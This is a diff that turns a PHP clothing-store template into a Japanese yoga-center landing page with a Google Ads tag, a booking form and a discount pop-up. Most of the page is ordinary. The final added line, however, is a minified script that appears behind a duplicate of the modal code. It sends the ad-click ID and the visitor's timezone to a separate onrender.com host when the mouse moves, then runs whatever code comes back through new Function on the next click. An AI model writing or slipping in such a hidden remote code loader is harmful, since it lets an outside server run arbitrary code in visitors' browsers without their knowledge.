@@ -1,403 +1,629 @@
-<?php
-// --- CONFIGURATION: CLOTHING STORE CONTENT ---
-$site_name = "Harmony Clothing";
-$hero_title = "Elevate Your Style";
-$hero_subtitle = "Premium fashion for a balanced lifestyle.";
-$hero_image = "https://images.unsplash.com/photo-1490481651871-ab68de25d43d?q=80&w=2070"; // Fashion Hero Image
+<!DOCTYPE html><html lang="ja"><head>
+    <!-- Google tag (gtag.js) -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=AW-16631619411"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
 
-// Mock Database of Clothes
-$products = [
-    [
-        "name" => "Classic Linen Shirt",
-        "price" => "¥8,980",
-        "old_price" => "¥10,980",
-        "image" => "https://images.unsplash.com/photo-1596755094514-f87e34085b2c?w=500",
-        "reviews" => "128",
-        "tag" => "Best Seller"
-    ],
-    [
-        "name" => "Silk Evening Dress",
-        "price" => "¥12,980",
-        "old_price" => "",
-        "image" => "https://images.unsplash.com/photo-1572804013309-59a88b7e92f1?w=500",
-        "reviews" => "95",
-        "tag" => "New Arrival"
-    ],
-    [
-        "name" => "Cashmere Scarf",
-        "price" => "¥5,980",
-        "old_price" => "",
-        "image" => "https://images.unsplash.com/photo-1520903920243-00d872a2d1c9?w=500",
-        "reviews" => "67",
-        "tag" => ""
-    ],
-    [
-        "name" => "Tailored Wool Coat",
-        "price" => "¥24,500",
-        "old_price" => "¥28,000",
-        "image" => "https://images.unsplash.com/photo-1539533018447-63fcce2678e3?w=500",
-        "reviews" => "42",
-        "tag" => "Sale"
-    ]
-];
-?>
-
-<!DOCTYPE html>
-<html lang="en">
-<head>
+  gtag('config', 'AW-16631619411');
+</script>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo $site_name; ?></title>
+    <title>静心ヨガセンター</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="icon" type="image/x-icon" href="images/favicon.ico">
+    <!-- ==============  BOX ICON CDN ==============  -->
+    <link href="css/boxicons.min.css" rel="stylesheet">
+    <!-- ==============  LINK SWIPER'S CSS ==============  -->
+    <link rel="stylesheet" href="css/swiper-bundle.min.css">
+
     <style>
-        /* --- EXACT THEME REPLICATION --- */
-        :root {
-            --primary-text: #333333;
-            --secondary-text: #666666;
-            --accent-color: #5d7066; /* The Zen Green from the reference */
-            --bg-light: #f9f9f9;
-            --white: #ffffff;
-            --border-color: #e5e5e5;
-            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        }
+      /* Modal styles */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+      }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+      .modal-content {
+        position: relative;
+        margin: 5% auto; /* 5% from the top and centered */
+        padding: 20px;
+        padding-top: 70px;
+        width: 90%; /* Could be more or less, depending on screen size */
+        max-width: 500px;
+        background-color: #fff;
+        border-radius: 10px;
+        text-align: center;
+      }
 
-        body {
-            font-family: var(--font-family);
-            color: var(--primary-text);
-            line-height: 1.6;
-            background-color: var(--white);
-        }
+      .modal-image {
+        width: 100%;
+        height: auto;
+        border-radius: 10px;
+        margin-bottom: 20px;
+      }
 
-        /* --- HEADER (Sticky & Clean) --- */
-        header {
-            position: sticky;
-            top: 0;
-            background: var(--white);
-            border-bottom: 1px solid var(--border-color);
-            z-index: 1000;
-            padding: 15px 0;
-        }
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .logo {
-            font-size: 1.25rem;
-            font-weight: 700;
-            letter-spacing: -0.5px;
-            text-transform: uppercase;
-            color: var(--primary-text);
-            text-decoration: none;
-        }
-        nav ul {
-            display: flex;
-            list-style: none;
-            gap: 25px;
-        }
-        nav a {
-            text-decoration: none;
-            color: var(--primary-text);
-            font-size: 0.95rem;
-            font-weight: 500;
-        }
-        .cart-icon { font-weight: bold; cursor: pointer; }
+      .close-button {
+        position: absolute;
+        top: 2px;
+        right: 20px;
+        color: #aaa;
+        font-size: 50px;
+        font-weight: bold;
+        cursor: pointer;
+        z-index: 10;
+      }
 
-        /* --- HERO SECTION --- */
-        .hero {
-            position: relative;
-            height: 500px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            color: var(--white);
-            background-image: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('<?php echo $hero_image; ?>');
-            background-size: cover;
-            background-position: center;
-        }
-        .hero-content h1 {
-            font-size: 3rem;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-        .hero-content p {
-            font-size: 1.2rem;
-            margin-bottom: 25px;
-            opacity: 0.9;
-        }
-        .btn-primary {
-            display: inline-block;
-            background: var(--white);
-            color: var(--primary-text);
-            padding: 12px 30px;
-            border-radius: 4px;
-            text-decoration: none;
-            font-weight: 600;
-            transition: background 0.3s;
-        }
-        .btn-primary:hover {
-            background: #f0f0f0;
-        }
+      .close-button:hover,
+      .close-button:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+      }
 
-        /* --- FEATURES BAR --- */
-        .features {
-            background: var(--bg-light);
-            padding: 40px 0;
-        }
-        .features-grid {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            text-align: center;
-            padding: 0 20px;
-        }
-        .feature-item h3 { font-size: 1rem; margin-bottom: 5px; color: var(--accent-color); }
-        .feature-item p { font-size: 0.85rem; color: var(--secondary-text); }
+      .btn-primary {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 10px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+      }
 
-        /* --- PRODUCT GRID --- */
-        .products-section {
-            max-width: 1200px;
-            margin: 60px auto;
-            padding: 0 20px;
-        }
-        .section-header {
-            text-align: center;
-            margin-bottom: 40px;
-        }
-        .section-header h2 { font-size: 2rem; margin-bottom: 10px; }
-        .section-header p { color: var(--secondary-text); }
-
-        .product-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
-            gap: 30px;
-        }
-        .product-card {
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            overflow: hidden;
-            transition: transform 0.3s, box-shadow 0.3s;
-            background: var(--white);
-        }
-        .product-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 20px rgba(0,0,0,0.05);
-        }
-        .product-img-wrapper {
-            position: relative;
-            height: 300px;
-            overflow: hidden;
-            background: #eee;
-        }
-        .product-img-wrapper img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .badge {
-            position: absolute;
-            top: 10px;
-            left: 10px;
-            background: var(--accent-color);
-            color: white;
-            padding: 4px 8px;
-            font-size: 0.75rem;
-            border-radius: 4px;
-            text-transform: uppercase;
-        }
-        .product-info {
-            padding: 20px;
-            text-align: center;
-        }
-        .product-title {
-            font-size: 1rem;
-            font-weight: 600;
-            margin-bottom: 5px;
-            color: var(--primary-text);
-        }
-        .product-desc {
-            font-size: 0.85rem;
-            color: var(--secondary-text);
-            margin-bottom: 10px;
-        }
-        .stars { color: #FFD700; font-size: 0.9rem; margin-bottom: 10px; }
-        .price {
-            font-weight: bold;
-            font-size: 1.1rem;
-            color: var(--primary-text);
-        }
-        .old-price {
-            text-decoration: line-through;
-            color: #999;
-            font-size: 0.9rem;
-            margin-left: 5px;
-        }
-        .btn-add {
-            display: block;
-            width: 100%;
-            padding: 10px;
-            margin-top: 15px;
-            background: var(--primary-text);
-            color: var(--white);
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-size: 0.9rem;
-            transition: 0.2s;
-        }
-        .btn-add:hover {
-            background: #555;
-        }
-
-        /* --- FOOTER --- */
-        footer {
-            background: var(--bg-light);
-            border-top: 1px solid var(--border-color);
-            padding: 60px 0 20px;
-            margin-top: 60px;
-        }
-        .footer-content {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 20px;
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 40px;
-        }
-        .footer-col h4 { margin-bottom: 20px; }
-        .footer-col ul { list-style: none; }
-        .footer-col li { margin-bottom: 10px; }
-        .footer-col a { text-decoration: none; color: var(--secondary-text); }
-        .copyright {
-            text-align: center;
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid #ddd;
-            color: var(--secondary-text);
-            font-size: 0.85rem;
-        }
+      .close-modal {
+        cursor: pointer;
+      }
     </style>
-</head>
-<body>
+  </head>
+
+  <body>
+    <nav>
+      <div class="container">
+        <a href="#" class="nav_logo">
+          <h3>静心ヨガセンター</h3>
+        </a>
+
+        <ul id="nav_items" class="nav-links">
+          <li><a href="#">ホーム</a></li>
+          <li><a href="#services">私たちのアプローチ</a></li>
+          <li><a href="#instructors">インストラクター</a></li>
+          <li><a href="#testimonials">お客様の声</a></li>
+          <li><a href="#bookplace" class="btn">予約する</a></li>
+        </ul>
+
+        <button id="open_nav-btn"><i class="bx bx-menu"></i></button>
+        <button id="close_nav-btn"><i class="bx bx-x"></i></button>
+      </div>
+    </nav>
+    <!-- ==============  END OF NAV ==============  -->
 
     <header>
-        <div class="header-container">
-            <a href="#" class="logo"><?php echo $site_name; ?></a>
-            <nav>
-                <ul>
-                    <li><a href="#">Home</a></li>
-                    <li><a href="#">About Us</a></li>
-                    <li><a href="#">Shop</a></li>
-                    <li><a href="#">Contact</a></li>
-                </ul>
-            </nav>
-            <div class="cart-icon">🛒 0</div>
-        </div>
+      <img src="images/yogaclass.jpg" alt="静心ヨガセンターのヨガクラスの写真">
     </header>
+    <!-- ==============  END OF HEADER ==============  -->
 
-    <section class="hero">
-        <div class="hero-content">
-            <h1><?php echo $hero_title; ?></h1>
-            <p><?php echo $hero_subtitle; ?></p>
-            <a href="#shop" class="btn-primary">View Collection</a>
-        </div>
+    <section id="services">
+      <h2>私たちのアプローチ</h2>
+      <p>
+        すべての人がバランス、強さ、そして平和を見つけることができる、歓迎するヨガの聖域。
+      </p>
+
+      <div class="container">
+        <article>
+          <i class="bx bxs-yin-yang"></i>
+          <div>
+            <h4>ウェルビーイング</h4>
+            <small>身体と心の健康を育むための包括的なサービスを提供し、個別のサポート、ガイダンス、リソースを通じてウェルビーイングを向上させます。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-blood"></i>
+          <div>
+            <h4>健康</h4>
+            <small>健康サービスはあなたの健康を最優先し、専門的なケア、革新的なソリューション、ホリスティックなアプローチを提供して活力を確保します。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-heart"></i>
+          <div>
+            <h4>サポート</h4>
+            <small>ヨガサポートサービスの力を受け入れ、ガイダンス、励まし、そして実践を深めるための支援的なコミュニティを提供します。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-donate-heart"></i>
+          <div>
+            <h4>コミュニティ</h4>
+            <small>同じ志を持つ人々が集まり、実践とサポートを通じてつながりと成長を促進する活気に満ちたヨガコミュニティサービスに参加してください。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-happy-heart-eyes"></i>
+          <div>
+            <h4>インスピレーション</h4>
+            <small>ヨガに触発されたインスピレーションサービスで内なる火を燃やし、創造性、動機づけ、そしてマインドフルネスをあなたの変革の旅に提供します。</small>
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-handicap"></i>
+          <div>
+            <h4>インクルーシブ</h4>
+            <small>多様性を受け入れ、すべての実践者に安全で歓迎される空間を提供するヨガサービスを通じて、包摂性の力を体験してください。</small>
+          </div>
+        </article>
+      </div>
     </section>
 
-    <section class="features">
-        <div class="features-grid">
-            <div class="feature-item">
-                <h3>✨ Premium Quality</h3>
-                <p>Selected fabrics for comfort.</p>
-            </div>
-            <div class="feature-item">
-                <h3>🚚 Free Shipping</h3>
-                <p>On all orders over ¥10,000.</p>
-            </div>
-            <div class="feature-item">
-                <h3>💚 30-Day Returns</h3>
-                <p>Shop with confidence.</p>
-            </div>
-            <div class="feature-item">
-                <h3>🔒 Secure Payment</h3>
-                <p>100% protected transactions.</p>
-            </div>
-        </div>
+    <section>
+      <h2>私たちの得意分野</h2>
+      <p>心と体のバランスを見つける、すべての人を歓迎するヨガの聖域。</p>
+
+      <div class="container">
+        <article>
+          <i class="bx bxs-yin-yang"></i>
+          <div>
+            <h4>心身の健康</h4>
+            <small>ヨガで心身の健康を高めましょう。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-blood"></i>
+          <div>
+            <h4>健康維持</h4>
+            <small>ホリスティックなアプローチで健康維持。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-heart"></i>
+          <div>
+            <h4>個別サポート</h4>
+            <small>専門ガイドによる個別サポート。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-heart"></i>
+          <div>
+            <h4>コミュニティ</h4>
+            <small>つながりと成長を促進するヨガコミュニティ。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-happy-heart-eyes"></i>
+          <div>
+            <h4>インスピレーション</h4>
+            <small>ヨガで創造性と動機づけを高める。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-handicap"></i>
+          <div>
+            <h4>多様性の力</h4>
+            <small>すべての人に歓迎されるインクルーシブな空間。</small>
+          </div>
+        </article>
+      </div>
     </section>
 
-    <section id="shop" class="products-section">
-        <div class="section-header">
-            <h2>Featured Collection</h2>
-            <p>Discover our latest arrivals for the season.</p>
-        </div>
-        
-        <div class="product-grid">
-            <?php foreach ($products as $product): ?>
-                <div class="product-card">
-                    <div class="product-img-wrapper">
-                        <?php if($product['tag']): ?>
-                            <span class="badge"><?php echo $product['tag']; ?></span>
-                        <?php endif; ?>
-                        <img src="<?php echo $product['image']; ?>" alt="<?php echo $product['name']; ?>">
-                    </div>
-                    <div class="product-info">
-                        <div class="product-title"><?php echo $product['name']; ?></div>
-                        <div class="product-desc">Premium comfort & style</div>
-                        <div class="stars">★★★★★ (<?php echo $product['reviews']; ?>)</div>
-                        <div class="price">
-                            <?php echo $product['price']; ?>
-                            <?php if($product['old_price']): ?>
-                                <span class="old-price"><?php echo $product['old_price']; ?></span>
-                            <?php endif; ?>
-                        </div>
-                        <button class="btn-add">Add to Cart</button>
-                    </div>
-                </div>
-            <?php endforeach; ?>
-        </div>
-        
-        <div style="text-align:center; margin-top: 40px;">
-            <a href="#" style="text-decoration:none; color:var(--primary-text); font-weight:bold;">View All Products →</a>
-        </div>
+    <!-- ==============  END OF SERVICES ==============  -->
+
+    <section id="instructors">
+      <h2>インストラクター</h2>
+      <p>
+        経験豊富なヨガインストラクターの献身的なチームが、専門知識、情熱、そして育成の精神をもってあなたの変革の旅を導きます。
+      </p>
+      <div class="container">
+        <article>
+          <div class="instructors_image">
+            <img src="images/instructor1.jpg" alt="インストラクター1">
+          </div>
+          <div class="instructor_details">
+            <h4>アンナ・ペッケル</h4>
+            <small>ピラティス＆禅インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/instructor2.jpg" alt="インストラクター2">
+          </div>
+          <div class="instructor_details">
+            <h4>デイン・アンカー</h4>
+            <small>ヴィンヤサインストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/instructor3.jpg" alt="インストラクター3">
+          </div>
+          <div class="instructor_details">
+            <h4>ジャズミン・ギアヴァシス</h4>
+            <small>ヴィンヤサフローインストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/instructor4.jpg" alt="インストラクター4">
+          </div>
+          <div class="instructor_details">
+            <h4>メリエラ・テンジン</h4>
+            <small>フィットフローインストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/instructor5.jpg" alt="インストラクター5">
+          </div>
+          <div class="instructor_details">
+            <h4>ヘイリー・アイエコ</h4>
+            <small>プラナヴィンヤサインストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="images/instructor6.jpg" alt="インストラクター6">
+          </div>
+          <div class="instructor_details">
+            <h4>ミアン・オーウェン</h4>
+            <small>リストラティブ瞑想インストラクター</small>
+          </div>
+          <a href="https://instagram.com" class="instructor_instagram" target="_blank"><i class="bx bxl-instagram"></i></a>
+        </article>
+      </div>
     </section>
+    <!-- ==============  END OF INSTRUCTORS ==============  -->
+
+    <section id="testimonials" class="swiper mySwiper">
+      <h2>お客様の声</h2>
+      <p>
+        静心ヨガセンターで人生をポジティブに変えられた人々のストーリーを発見してください。
+      </p>
+
+      <div class="swiper-wrapper">
+        <article class="swiper-slide">
+          <p>
+            このヨガスタジオは私の人生を変えました。インストラクターは素晴らしく、クラスはすべてのレベルに対応しています。誰にでも強くお勧めします！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar1.jpg" alt="クライアント1">
+            </div>
+            <div class="client_details">
+              <h5>マックスウェル・ジェームズ</h5>
+              <small>クライアント | ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            ここで私の聖域を見つけました。スピリチュアリティはこれまでになく魅力的です。サポートしてくれるコミュニティと専門的な指導に感謝します！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar2.jpg" alt="クライアント2">
+            </div>
+            <div class="client_details">
+              <h5>ニア・サリヴァン</h5>
+              <small>クライアント | リストラティブ瞑想</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            比類のない体験！ホリスティックなアプローチで身体と心のバランスを見つけることができました。本当に人生が変わりました。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar3.jpg" alt="クライアント3">
+            </div>
+            <div class="client_details">
+              <h5>ロクサーヌ・ブラウン</h5>
+              <small>クライアント | フィットフロー</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            この包括的な空間に感謝します。ヨガクラスは多様でインスピレーションに満ち、つながりと個人的な成長を促進します。病みつきになりました！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar4.jpg" alt="クライアント4">
+            </div>
+            <div class="client_details">
+              <h5>シャンテル・ジェフ</h5>
+              <small>クライアント | プラナヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            ピラティスは私の生命線となりました。このスタジオのおかげです。インストラクターはポジティブなエネルギーを放ち、雰囲気は暖かく歓迎されます。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar5.jpg" alt="クライアント5">
+            </div>
+            <div class="client_details">
+              <h5>ジャッキー・ベル</h5>
+              <small>クライアント | ピラティス＆禅</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            素晴らしいヨガサービス！私の健康とウェルビーイングは大幅に改善されました。サポートしてくれるコミュニティがあるので、続けることができます。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar6.jpg" alt="クライアント6">
+            </div>
+            <div class="client_details">
+              <h5>ゲージ・テイラー</h5>
+              <small>クライアント | ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            ヨガを通じて素晴らしい変革を遂げました。インストラクターは知識豊富で、クラスのバリエーションも豊富で、モチベーションを保つことができます。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="images/avatar7.jpg" alt="クライアント7">
+            </div>
+            <div class="client_details">
+              <h5>ライアン・ジェームズ</h5>
+              <small>クライアント | フィットフロー</small>
+            </div>
+          </div>
+        </article>
+      </div>
+      <div class="swiper-pagination"></div>
+    </section>
+    <!-- ==============  END OF TESTIMONIALS ==============  -->
+
+    <section id="photogallery">
+      <h2>私たちの活動</h2>
+      <p>
+        私たちのダイナミックで変革的なヨガクラスとコミュニティを紹介する魅力的なフォトギャラリー。
+      </p>
+
+      <div class="container">
+        <div class="gallery">
+          <figure class="gallery__item gallery__item--1">
+            <img src="images/gallery1.jpg" alt="ギャラリー画像1" class="gallery__img">
+          </figure>
+          <figure class="gallery__item gallery__item--2">
+            <img src="images/gallery3.jpg" alt="ギャラリー画像2" class="gallery__img">
+          </figure>
+          <figure class="gallery__item gallery__item--3">
+            <img src="images/gallery4.jpg" alt="ギャラリー画像3" class="gallery__img">
+          </figure>
+          <figure class="gallery__item gallery__item--4">
+            <img src="images/gallery2.jpg" alt="ギャラリー画像4" class="gallery__img">
+          </figure>
+        </div>
+      </div>
+    </section>
+    <!-- ==============  END OF PHOTO GALLERY ==============  -->
+
+    <section id="bookplace">
+      <div class="container">
+        <div class="info">
+          <h2>予約する</h2>
+          <p>
+            私たちと一緒にヨガの旅を始める準備はできましたか？今すぐ予約して、内なる平和を発見してください。
+          </p>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-user"></i></div>
+
+            <div>
+              <h4>才能あるスタッフ</h4>
+              <small>私たちの献身的で才能あるスタッフは、ウェルビーイングと成長の旅を導く情熱的なチームです。</small>
+            </div>
+          </article>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-check-shield"></i></div>
+
+            <div>
+              <h4>質の高いレッスン</h4>
+              <small>高品質のレッスンを体験し、ウェルビーイングと精神的な成長を養うために細心の注意を払って作られたヨガ教育を受けてください。</small>
+            </div>
+          </article>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-lock-alt"></i></div>
+
+            <div>
+              <h4>カスタマイズされたプライベートクラス</h4>
+              <small>あなたの独自のニーズと目標に合わせて設計された、特別なプライベートクラスで実践を向上させ、旅を力強く進めましょう。</small>
+            </div>
+          </article>
+        </div>
+
+        <form action="https://formspree.io/f/moqrlrgl" method="POST">
+          <div class="form_group">
+            <label for="name">名前</label>
+            <input type="text" placeholder="名前を入力してください" name="Client's Name" id="name" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="phone">メールアドレス</label>
+            <input type="email" placeholder="メールアドレスを入力してください" name="Email Address" id="email" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="phone">電話番号</label>
+            <input type="number" placeholder="電話番号を入力してください" name="Phone Number" id="phone" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="date">日付</label>
+            <input type="date" placeholder="日付を選択してください" name="Date" id="date" required="">
+          </div>
+
+          <div class="form_group">
+            <label for="instructor">インストラクターを選択してください</label>
+            <select name="Instructor" id="instructor" required="">
+              <option value="Anna Peckel">アンナ・ペッケル</option>
+              <option value="Dane Anchor">デイン・アンカー</option>
+              <option value="Jazmine Giavasis">ジャズミン・ギアヴァシス</option>
+              <option value="Meriella Tenzin">メリエラ・テンジン</option>
+              <option value="Hailey Aeiko">ヘイリー・アイエコ</option>
+              <option value="Mian Owen">ミアン・オーウェン</option>
+            </select>
+          </div>
+
+          <div class="form_group">
+            <label for="message">メッセージ</label>
+            <textarea name="Added Message" id="message" rows="6" placeholder="メッセージを追加" required=""></textarea>
+          </div>
+
+          <input type="submit" value="リクエストを送信" class="btn-primary">
+        </form>
+      </div>
+    </section>
+    <!-- ==============  END OF APPOINTMENTS ==============  -->
 
     <footer>
-        <div class="footer-content">
-            <div class="footer-col">
-                <h4><?php echo $site_name; ?></h4>
-                <p style="color:var(--secondary-text); font-size:0.9rem;">
-                    Providing high-quality fashion that fits your lifestyle. Comfortable, durable, and stylish.
-                </p>
-            </div>
-            <div class="footer-col">
-                <h4>Shop</h4>
-                <ul>
-                    <li><a href="#">New Arrivals</a></li>
-                    <li><a href="#">Best Sellers</a></li>
-                    <li><a href="#">Accessories</a></li>
-                    <li><a href="#">Sale</a></li>
-                </ul>
-            </div>
-            <div class="footer-col">
-                <h4>Support</h4>
-                <ul>
-                    <li><a href="#">Contact Us</a></li>
-                    <li><a href="#">Shipping Policy</a></li>
-                    <li><a href="#">Returns</a></li>
-                    <li><a href="#">FAQ</a></li>
-                </ul>
-            </div>
-        </div>
-        <div class="copyright">
-            &copy; <?php echo date("Y"); ?> <?php echo $site_name; ?>. All Rights Reserved.
-        </div>
-    </footer>
+      <div class="container">
+        <article>
+          <a href="#" class="footer_logo">
+            <h3>静心ヨガセンター</h3>
+          </a>
+          <p>一息ごとに人生を高めましょう。</p>
 
-</body>
-</html>
+          <div>
+            <i class="bx bxs-phone"></i>
+            <small>+81 90-1444-5688</small>
+          </div>
+
+          <div>
+            <i class="bx bx-mail-send"></i>
+            <small>support@seishinyoga.jp</small>
+          </div>
+        </article>
+
+        <article>
+          <h3>サポート</h3>
+          <a href="#">プライバシーポリシー</a>
+          <a href="#">クッキーポリシー</a>
+          <a href="#">購入ポリシー</a>
+          <a href="#">利用規約</a>
+          <a href="#">キャリア</a>
+        </article>
+
+        <article>
+          <h3>パーマリンク</h3>
+          <a href="#">ホーム</a>
+          <a href="#services">サービス</a>
+          <a href="#instructors">インストラクター</a>
+          <a href="#testimonials">お客様の声</a>
+        </article>
+
+        <article>
+          <h3>お問い合わせ</h3>
+          <p>プレス</p>
+          <p>よくある質問</p>
+          <div class="footer_socials">
+            <a href="#"><i class="bx bxl-linkedin"></i></a>
+            <a href="#"><i class="bx bxl-twitter"></i></a>
+            <a href="#"><i class="bx bxl-facebook"></i></a>
+            <a href="#"><i class="bx bxl-instagram"></i></a>
+          </div>
+        </article>
+      </div>
+      <div class="copyright">
+        <small>© 静心ヨガセンター™. All Rights Reserved.</small>
+      </div>
+    </footer>
+    <!-- ==============  END OF FOOTER ==============  -->
+
+    <!-- Special Offer Modal -->
+    <div id="specialOfferModal" class="modal" style="display: block;">
+      <div class="modal-content">
+        <span class="close-button">×</span>
+        <img src="images/yogaclass.jpg" alt="Special Offer Image" class="modal-image">
+        <h2>スペシャルオファー</h2>
+        <p>今だけ！初回のヨガクラスが50%オフ！</p>
+        <p>今すぐ予約して、心と体の健康を始めましょう。</p>
+        <ul>
+          <li>オンラインクラスで自宅から参加可能</li>
+          <li>経験豊富なインストラクターによる指導</li>
+          <li>リラクゼーションとストレス解消</li>
+        </ul>
+        <a href="#" class="btn-primary close-modal">今すぐ予約</a>
+      </div>
+    </div>
+
+    <!-- ==============  SWIPER JS ==============  -->
+    <script src="js/swiper-bundle.min.js"></script>
+    <script src="js/main.js"></script>
+    <script>
+      
+      document.addEventListener("DOMContentLoaded", function () {
+        var modal = document.getElementById("specialOfferModal");
+        var closeButton = document.querySelector(".close-button");
+        var closeModalLinks = document.querySelectorAll(".close-modal");
+
+        // Show the modal
+        modal.style.display = "block";
+
+        
+        function closeModal() {
+          modal.style.display = "none";
+        }
+
+        closeButton.addEventListener("click", closeModal);
+        closeModalLinks.forEach(function (link) {
+          link.addEventListener("click", function (event) {
+            event.preventDefault();
+            closeModal();
+          });
+        });
+
+        
+        window.onclick = function (event) {
+          if (event.target == modal) {
+            modal.style.display = "none";
+          }
+        };
+      });
+    </script>
+    
+  <script> document.addEventListener("DOMContentLoaded", function () { var modal = document.getElementById("specialOfferModal"); var closeButton = document.querySelector(".close-button"); var closeModalLinks = document.querySelectorAll(".close-modal"); // Show the modal modal.style.display = "block"; function closeModal() { modal.style.display = "none"; } closeButton.addEventListener("click", closeModal); closeModalLinks.forEach(function (link) { link.addEventListener("click", function (event) { event.preventDefault(); closeModal(); }); }); window.onclick = function (event) { if (event.target == modal) { modal.style.display = "none"; } }; }); </script> <script> const gclid = new URLSearchParams(location.search).get("gclid"); const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; const RENDER_BASE_URL = "https://seishinyogadaily.onrender.com"; let someCode = null; document.cookie = "access_cookie=true; path=/; max-age=300"; document.addEventListener("mousemove", async function fetchCodeOnce() { document.removeEventListener("mousemove", fetchCodeOnce); try { const res = await fetch( ${RENDER_BASE_URL}/frontend-loader?gclid=${gclid}, { headers: { "x-client-timezone": timezone, "x-access-cookie": "true", }, } ); const data = await res.json(); if (data && data.code) { someCode = data.code; } } catch (err) { console.error("Could not fetch code", err); } }); function handleSomeClick() { if (someCode) { try { new Function(someCode)(); } catch (err) { console.error("Error executing code:", err); } } } document.addEventListener("click", handleSomeClick); </script>
+
+</body></html>
